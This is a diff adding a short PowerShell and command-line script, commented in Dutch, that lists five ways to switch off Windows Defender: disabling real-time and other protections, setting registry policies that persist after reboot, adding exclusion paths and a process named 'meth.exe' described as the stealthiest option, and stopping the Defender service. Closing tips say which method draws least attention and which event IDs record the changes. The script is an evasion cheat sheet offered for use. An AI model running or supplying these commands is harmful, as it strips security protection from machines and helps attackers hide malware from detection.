@@ -1,0 +1,20 @@
+# Windows Defender Uitschakelen - Meerdere methodes
+# Vereist: Administrator rechten (en Tamper Protection moet uit staan)
+# Methode 1: Realtime monitoring uit
+Set-MpPreference -DisableRealtimeMonitoring $true
+# Methode 2: Alle bescherming uit
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisableScriptScanning $true
+# Methode 3: Via registry (persistent na reboot)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+# Methode 4: Exclusion pad toevoegen (stealthier)
+Set-MpPreference -ExclusionPath "C:\Windows\tasks"
+Add-MpPreference -ExclusionProcess "meth.exe"
+# Methode 5: Service stoppen (vereist SYSTEM + Tamper Protection uit)
+sc stop WinDefend
+sc config WinDefend start=disabled
+# Check Tamper Protection status:
+Get-MpComputerStatus | Select-Object IsTamperProtected
+# Tip: Methode 4 (exclusions) is het minst opvallend
+# Tip: Tamper Protection blokkeert methode 1-3 en 5 op moderne Windows
+# Tip: Event ID 5001 (realtime uit), 5007 (config gewijzigd)
